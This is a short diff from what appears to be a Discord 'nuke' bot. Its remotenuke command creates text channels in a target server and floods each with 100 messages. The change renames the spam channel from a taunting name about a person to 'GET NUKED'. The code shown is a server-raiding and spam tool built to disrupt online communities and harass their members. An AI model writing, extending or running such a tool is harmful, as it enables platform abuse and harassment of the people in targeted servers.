@@ -185,7 +185,7 @@ async def remotenuke(ctx, guild_id: int):
 
     async def create_and_message(index):
         try:
-            channel = await guild.create_text_channel("happy-is-edater")
+            channel = await guild.create_text_channel("GET NUKED")
             for i in range(100):  # Messages per channel
                 await channel.send(message)
                 print(f"Sent message {index+1}")
@@ -204,3 +204,4 @@ async def remotenuke(ctx, guild_id: int):
 
 
 bot.run('')
+
